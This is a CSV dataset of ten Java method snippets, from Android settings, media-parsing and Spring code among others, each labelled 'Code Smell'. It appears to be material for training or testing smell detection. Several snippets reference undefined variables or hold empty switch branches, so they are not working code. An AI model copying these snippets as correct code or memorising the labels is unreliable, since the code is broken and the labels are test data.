text,label,text_label
"public AuthorizationSettingDetail toAuthorizationSettingDetail(List<MenuEntity> menuEntities){
  Map<String,MenuEntity> menuMap=menuEntities.stream().collect(Collectors.toMap(MenuEntity::getId,Function.identity()));
  AuthorizationSettingDetail detail=new AuthorizationSettingDetail();
  detail.setTargetType(targetType);
  detail.setTargetId(targetId);
  detail.setMerge(merge);
  detail.setPriority(priority);
  Map<String,Set<String>> permissionInfos=new ConcurrentHashMap<>();
  for (  MenuView menu : menus) {
    List<MenuView> expand=TreeSupportEntity.expandTree2List(menu,IDGenerator.MD5);
    for (    MenuView menuView : expand) {
      if (!menu.isGranted()) {
        continue;
      }
      MenuEntity entity=menuMap.get(menuView.getId());
      if (entity == null) {
        continue;
      }
      if (CollectionUtils.isNotEmpty(entity.getPermissions())) {
        for (        PermissionInfo permission : entity.getPermissions()) {
          if (StringUtils.hasText(permission.getPermission()) && CollectionUtils.isNotEmpty(permission.getActions())) {
            permissionInfos.computeIfAbsent(permission.getPermission(),ignore -> new HashSet<>()).addAll(permission.getActions());
          }
        }
      }
      if (CollectionUtils.isNotEmpty(menuView.getButtons())) {
        for (        MenuView.ButtonView button : menuView.getButtons()) {
          if (!button.isGranted()) {
            continue;
          }
          entity.getButton(button.getId()).ifPresent(buttonInfo -> {
            if (CollectionUtils.isNotEmpty(buttonInfo.getPermissions())) {
              for (              PermissionInfo permission : buttonInfo.getPermissions()) {
                if (CollectionUtils.isEmpty(permission.getActions())) {
                  continue;
                }
                permissionInfos.computeIfAbsent(permission.getPermission(),ignore -> new HashSet<>()).addAll(permission.getActions());
              }
            }
          }
);
        }
      }
    }
  }
  detail.setPermissionList(permissionInfos.entrySet().stream().map(e -> AuthorizationSettingDetail.PermissionInfo.of(e.getKey(),e.getValue())).collect(Collectors.toList()));
  return detail;
}",1,Code Smell
"public static void loadProxyList(){
  if (proxyListLoaded) {
    return;
  }
  SharedPreferences preferences=ApplicationLoader.applicationContext.getSharedPreferences(""mainconfig"",Activity.MODE_PRIVATE);
  String proxyAddress=preferences.getString(""proxy_ip"","""");
  String proxyUsername=preferences.getString(""proxy_user"","""");
  String proxyPassword=preferences.getString(""proxy_pass"","""");
  String proxySecret=preferences.getString(""proxy_secret"","""");
  int proxyPort=preferences.getInt(""proxy_port"",1080);
  proxyListLoaded=true;
  proxyList.clear();
  currentProxy=null;
  String list=preferences.getString(""proxy_list"",null);
  if (!TextUtils.isEmpty(list)) {
    byte[] bytes=Base64.decode(list,Base64.DEFAULT);
    SerializedData data=new SerializedData(bytes);
    int count=data.readInt32(false);
    if (count == -1) {
      int version=data.readByte(false);
      if (version == PROXY_SCHEMA_V2) {
        count=data.readInt32(false);
        for (int i=0; i < count; i++) {
          ProxyInfo info=new ProxyInfo(data.readString(false),data.readInt32(false),data.readString(false),data.readString(false),data.readString(false));
          info.ping=data.readInt64(false);
          info.availableCheckTime=data.readInt64(false);
          proxyList.add(0,info);
          if (currentProxy == null && !TextUtils.isEmpty(proxyAddress)) {
            if (proxyAddress.equals(info.address) && proxyPort == info.port && proxyUsername.equals(info.username) && proxyPassword.equals(info.password)) {
              currentProxy=info;
            }
          }
        }
      }
 else {
        FileLog.e(""Unknown proxy schema version: "" + version);
      }
    }
 else {
      for (int a=0; a < count; a++) {
        ProxyInfo info=new ProxyInfo(data.readString(false),data.readInt32(false),data.readString(false),data.readString(false),data.readString(false));
        proxyList.add(0,info);
        if (currentProxy == null && !TextUtils.isEmpty(proxyAddress)) {
          if (proxyAddress.equals(info.address) && proxyPort == info.port && proxyUsername.equals(info.username) && proxyPassword.equals(info.password)) {
            currentProxy=info;
          }
        }
      }
    }
    data.cleanup();
  }
  if (currentProxy == null && !TextUtils.isEmpty(proxyAddress)) {
    ProxyInfo info=currentProxy=new ProxyInfo(proxyAddress,proxyPort,proxyUsername,proxyPassword,proxySecret);
    proxyList.add(0,info);
  }
}",1,Code Smell
"@Override public void validateAndPostprocessResponse(HeaderPaginationList<I> respObj,Response httpResponse) throws IOException {
  super.validateAndPostprocessResponse(respObj,httpResponse);
  String link=httpResponse.header(""Link"");
  if (!TextUtils.isEmpty(link)) {
    Matcher matcher=LINK_HEADER_PATTERN.matcher(link);
    String url=null;
    while (matcher.find()) {
      if (url == null) {
        String _url=matcher.group(1);
        if (_url == null)         continue;
        url=_url;
      }
 else {
        String paramName=matcher.group(2);
        String paramValue=matcher.group(3);
        if (paramName == null || paramValue == null)         return;
        if (""rel"".equals(paramName)) {
switch (paramValue) {
case ""next"":
            ;
case ""prev"":
          ;
      }
      url=null;
    }
  }
}
}
}",1,Code Smell
"public void checkCamera(boolean request){
  if (parentAlert.baseFragment == null || parentAlert.baseFragment.getParentActivity() == null) {
    return;
  }
  boolean old=deviceHasGoodCamera;
  boolean old2=noCameraPermissions;
  if (!SharedConfig.inappCamera) {
    deviceHasGoodCamera=false;
  }
 else {
    if (Build.VERSION.SDK_INT >= 23) {
      if (noCameraPermissions=(parentAlert.baseFragment.getParentActivity().checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)) {
        if (request) {
          try {
            parentAlert.baseFragment.getParentActivity().requestPermissions(new String[]{Manifest.permission.CAMERA,Manifest.permission.READ_EXTERNAL_STORAGE},17);
          }
 catch (          Exception ignore) {
          }
        }
        deviceHasGoodCamera=false;
      }
 else {
        if (request || SharedConfig.hasCameraCache) {
          CameraController.getInstance().initCamera(null);
        }
        deviceHasGoodCamera=CameraController.getInstance().isCameraInitied();
      }
    }
 else {
      if (request || SharedConfig.hasCameraCache) {
        CameraController.getInstance().initCamera(null);
      }
      deviceHasGoodCamera=CameraController.getInstance().isCameraInitied();
    }
  }
  if (deviceHasGoodCamera && NekoConfig.disableInstantCamera.Bool()) {
    File file=new File(ApplicationLoader.getFilesDirFixed(),""cthumb.jpg"");
    if (file.exists())     file.delete();
  }
  if ((old != deviceHasGoodCamera || old2 != noCameraPermissions) && adapter != null) {
    adapter.notifyDataSetChanged();
  }
  if (parentAlert.isShowing() && deviceHasGoodCamera && parentAlert.baseFragment != null && parentAlert.getBackDrawable().getAlpha() != 0 && !cameraOpened && !NekoConfig.disableInstantCamera.Bool()) {
    showCamera();
  }
}",1,Code Smell
"private void doWriteState(){
  boolean wroteState=false;
  final int version;
  final ArrayMap<String,Setting> settings;
  final ArrayMap<String,String> namespaceBannedHashes;
synchronized (mLock) {
    version=mVersion;
    settings=new ArrayMap<>(mSettings);
    namespaceBannedHashes=new ArrayMap<>(mNamespaceBannedHashes);
    mDirty=false;
    mWriteScheduled=false;
  }
synchronized (mWriteLock) {
    if (DEBUG_PERSISTENCE) {
      Log.i(LOG_TAG,""[PERSIST START]"");
    }
    AtomicExtendedFile destination=new AtomicExtendedFile(mStatePersistFile.getFile());
    FileOutputStream out=null;
    try {
      out=destination.startWrite();
      TypedXmlSerializer serializer;
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
        serializer=Xml.newBinarySerializer();
      }
 else {
        serializer=Xml.newFastSerializer();
        serializer.setFeature(""http://xmlpull.org/v1/doc/features.html#indent-output"",true);
      }
      serializer.startDocument(null,true);
      serializer.startTag(null,TAG_SETTINGS);
      serializer.attributeInt(null,ATTR_VERSION,version);
      final int settingCount=settings.size();
      for (int i=0; i < settingCount; i++) {
        Setting setting=settings.valueAt(i);
        if (writeSingleSetting(mVersion,serializer,setting.getId(),setting.getName(),setting.getValue(),setting.getDefaultValue(),setting.getPackageName(),setting.getTag(),setting.isDefaultFromSystem(),setting.isValuePreservedInRestore())) {
          if (DEBUG_PERSISTENCE) {
            Log.i(LOG_TAG,""[PERSISTED] %s=%s"",setting.getName(),setting.getValue());
          }
        }
      }
      serializer.endTag(null,TAG_SETTINGS);
      serializer.startTag(null,TAG_NAMESPACE_HASHES);
      for (int i=0; i < namespaceBannedHashes.size(); i++) {
        String namespace=namespaceBannedHashes.keyAt(i);
        String bannedHash=namespaceBannedHashes.get(namespace);
        if (writeSingleNamespaceHash(serializer,namespace,bannedHash)) {
          if (DEBUG_PERSISTENCE) {
            Log.i(LOG_TAG,""[PERSISTED] namespace=%s, bannedHash=%s"",namespace,bannedHash);
          }
        }
      }
      serializer.endTag(null,TAG_NAMESPACE_HASHES);
      serializer.endDocument();
      destination.finishWrite(out);
      wroteState=true;
      if (DEBUG_PERSISTENCE) {
        Log.i(LOG_TAG,""[PERSIST END]"");
      }
    }
 catch (    Throwable t) {
      Log.e(LOG_TAG,""Failed to write settings, restoring backup"",t);
      if (t instanceof IOException) {
        logSettingsDirectoryInformation(Paths.get(destination.getBaseFile()));
        if (t.getMessage().contains(""Couldn't create directory"")) {
          Path parentPath=Paths.get(destination.getBaseFile().getParentFile());
          if (parentPath.mkdirs()) {
            Log.i(LOG_TAG,""Successfully created %s"",parentPath);
          }
 else {
            Log.e(LOG_TAG,""Failed to write %s with Files.writeDirectories"",parentPath);
          }
        }
      }
      destination.failWrite(out);
    }
 finally {
      IoUtils.closeQuietly(out);
    }
  }
  if (wroteState) {
synchronized (mLock) {
      addHistoricalOperationLocked(HISTORICAL_OPERATION_PERSIST,null);
    }
  }
}",1,Code Smell
"@Override public void run(){
  while (!isStopped) {
    try {
      long currentTime=System.currentTimeMillis();
      Set<String> removedNodeKey=new HashSet<>();
      for (      Map.Entry<String,TimeoutInfo> entry : nodeMap.entrySet()) {
        if (TStringUtils.isBlank(entry.getKey()) || entry.getValue() == null) {
          continue;
        }
        if (currentTime >= entry.getValue().getTimeoutTime()) {
          removedNodeKey.add(entry.getKey());
        }
      }
      if (!removedNodeKey.isEmpty()) {
        for (        String nodeKey : removedNodeKey) {
          TimeoutInfo timeoutInfo=nodeMap.get(nodeKey);
          if (timeoutInfo == null) {
            continue;
          }
          if (currentTime >= timeoutInfo.getTimeoutTime()) {
            nodeMap.remove(nodeKey);
            listener.onTimeout(nodeKey,timeoutInfo);
          }
        }
      }
      Thread.sleep(1000 * 1);
    }
 catch (    Throwable t) {
      logger.error(new StringBuilder(256).append(businessType).append("" heartbeat scan error!"").toString(),t);
    }
  }
}",1,Code Smell
"private void onMoovContainerAtomRead(ContainerAtom moov) throws ParserException {
  Assertions.checkState(sideloadedTrack == null,""Unexpected moov box."");
  DrmInitData drmInitData=sideloadedDrmInitData != null ? sideloadedDrmInitData : getDrmInitDataFromAtoms(moov.leafChildren);
  ContainerAtom mvex=moov.getContainerAtomOfType(Atom.TYPE_mvex);
  SparseArray<DefaultSampleValues> defaultSampleValuesArray=new SparseArray<>();
  long duration=C.TIME_UNSET;
  int mvexChildrenSize=mvex.leafChildren.size();
  for (int i=0; i < mvexChildrenSize; i++) {
    Atom.LeafAtom atom=mvex.leafChildren.get(i);
    if (atom.type == Atom.TYPE_trex) {
      Pair<Integer,DefaultSampleValues> trexData=parseTrex(atom.data);
      defaultSampleValuesArray.put(trexData.first,trexData.second);
    }
 else     if (atom.type == Atom.TYPE_mehd) {
      duration=parseMehd(atom.data);
    }
  }
  SparseArray<Track> tracks=new SparseArray<>();
  int moovContainerChildrenSize=moov.containerChildren.size();
  for (int i=0; i < moovContainerChildrenSize; i++) {
    Atom.ContainerAtom atom=moov.containerChildren.get(i);
    if (atom.type == Atom.TYPE_trak) {
      Track track=modifyTrack(AtomParsers.parseTrak(atom,moov.getLeafAtomOfType(Atom.TYPE_mvhd),duration,drmInitData,(flags & FLAG_WORKAROUND_IGNORE_EDIT_LISTS) != 0,false));
      if (track != null) {
        tracks.put(track.id,track);
      }
    }
  }
  int trackCount=tracks.size();
  if (trackBundles.size() == 0) {
    for (int i=0; i < trackCount; i++) {
      Track track=tracks.valueAt(i);
      TrackBundle trackBundle=new TrackBundle(extractorOutput.track(i,track.type));
      trackBundle.init(track,getDefaultSampleValues(defaultSampleValuesArray,track.id));
      trackBundles.put(track.id,trackBundle);
      durationUs=Math.max(durationUs,track.durationUs);
    }
    maybeInitExtraTracks();
    extractorOutput.endTracks();
  }
 else {
    Assertions.checkState(trackBundles.size() == trackCount);
    for (int i=0; i < trackCount; i++) {
      Track track=tracks.valueAt(i);
      trackBundles.get(track.id).init(track,getDefaultSampleValues(defaultSampleValuesArray,track.id));
    }
  }
}",1,Code Smell
"private void xAggr(SqlSth sqlSth,Q q,List<Object> valueList){
  if (q instanceof Q.X) {
    Q.X rm=(Q.X)q;
    List<Bb> list=rm.getAggrList();
    if (list == null)     return;
    for (    Bb bb : list) {
      String key=bb.getKey();
      if (key.contains(SqlScript.PLACE_HOLDER) && Objects.isNull(bb.getValue()))       continue;
      List<String> originList=mapping((reg) -> key.split(reg),q,sqlSth.sbCondition);
      for (      String origin : originList) {
        addConditonBeforeOptimization(origin,sqlSth.conditionSet);
      }
      Object values=bb.getValue();
      if (values instanceof Object[]) {
        for (        Object obj : arr) {
          add(valueList,obj);
        }
      }
 else       if (values instanceof List) {
        for (        Object obj : arr) {
          add(valueList,obj);
        }
      }
    }
  }
}
",1,Code Smell
"@SuppressWarnings({""rawtypes"",""unchecked""}) public FunctionCallback getFunctionCallback(@NonNull String beanName,@Nullable String defaultDescription){
  Type beanType=FunctionContextUtils.findType(this.applicationContext.getBeanFactory(),beanName);
  if (beanType == null) {
    throw new IllegalArgumentException(""Functional bean with name: "" + beanName + "" does not exist in the context."");
  }
  if (!Function.class.isAssignableFrom(FunctionTypeUtils.getRawType(beanType))) {
    throw new IllegalArgumentException(""Function call Bean must be of type Function. Found: "" + beanType.getTypeName());
  }
  Type functionInputType=TypeResolverHelper.getFunctionArgumentType(beanType,0);
  Class<?> functionInputClass=FunctionTypeUtils.getRawType(functionInputType);
  String functionName=beanName;
  String functionDescription=defaultDescription;
  if (!StringUtils.hasText(functionDescription)) {
    Description descriptionAnnotation=applicationContext.findAnnotationOnBean(beanName,Description.class);
    if (descriptionAnnotation != null) {
      functionDescription=descriptionAnnotation.value();
    }
    if (!StringUtils.hasText(functionDescription)) {
      JsonClassDescription jsonClassDescriptionAnnotation=functionInputClass.getAnnotation(JsonClassDescription.class);
      if (jsonClassDescriptionAnnotation != null) {
        functionDescription=jsonClassDescriptionAnnotation.value();
      }
    }
    if (!StringUtils.hasText(functionDescription)) {
      throw new IllegalStateException(""Could not determine function description."" + ""Please provide a description either as a default parameter, via @Description annotation on the bean "" + ""or @JsonClassDescription annotation on the input class."");
    }
  }
  Object bean=this.applicationContext.getBean(beanName);
  if (bean instanceof Function<?,?>) {
    return FunctionCallbackWrapper.builder(function).withName(functionName).withSchemaType(this.schemaType).withDescription(functionDescription).withInputType(functionInputClass).build();
  }
 else {
    throw new IllegalArgumentException(""Bean must be of type Function"");
  }
}",1,Code Smell
"/** 
 * Attempt to match a complete address in content, starting with houseNumberMatch.
 * @param content          The string to search.
 * @param houseNumberMatch A matching house number to start extending.
 * @return +ve: the end of the match+ve: the position to restart searching for house numbers, negated.
 */
private static int attemptMatch(String content,MatchResult houseNumberMatch){
  int restartPos=-1;
  int nonZipMatch=-1;
  int it=houseNumberMatch.end();
  int numLines=1;
  boolean consecutiveHouseNumbers=true;
  boolean foundLocationName=false;
  int wordCount=1;
  String lastWord="""";
  Matcher matcher=sWordRe.matcher(content);
  for (; it < content.length(); lastWord=matcher.group(0), it=matcher.end()) {
    if (!matcher.find(it)) {
      return -content.length();
    }
    if (matcher.end() - matcher.start() > kMaxAddressNameWordLength) {
      return -matcher.end();
    }
    while (it < matcher.start()) {
      if (NL.indexOf(content.charAt(it++)) != -1)       ++numLines;
    }
    if (numLines > MAX_ADDRESS_LINES)     break;
    if (++wordCount > MAX_ADDRESS_WORDS)     break;
    if (matchHouseNumber(content,it) != null) {
      if (consecutiveHouseNumbers && numLines > 1) {
        return -it;
      }
      if (restartPos == -1)       restartPos=it;
      continue;
    }
    consecutiveHouseNumbers=false;
    if (isValidLocationName(matcher.group(0))) {
      foundLocationName=true;
      continue;
    }
    if (wordCount == MAX_LOCATION_NAME_DISTANCE && !foundLocationName) {
      it=matcher.end();
      break;
    }
    if (foundLocationName && wordCount > MIN_ADDRESS_WORDS) {
      MatchResult stateMatch=matchState(content,it);
      if (stateMatch != null) {
        if (lastWord.equals(""et"") && stateMatch.group(0).equals(""al"")) {
          it=stateMatch.end();
          break;
        }
        Matcher zipMatcher=sWordRe.matcher(content);
        if (zipMatcher.find(stateMatch.end())) {
          if (isValidZipCode(zipMatcher.group(0),stateMatch)) {
            return zipMatcher.end();
          }
        }
 else {
          nonZipMatch=stateMatch.end();
        }
      }
    }
  }
  if (nonZipMatch > 0)   return nonZipMatch;
  return -(restartPos > 0 ? restartPos : it);
}",1,Code Smell
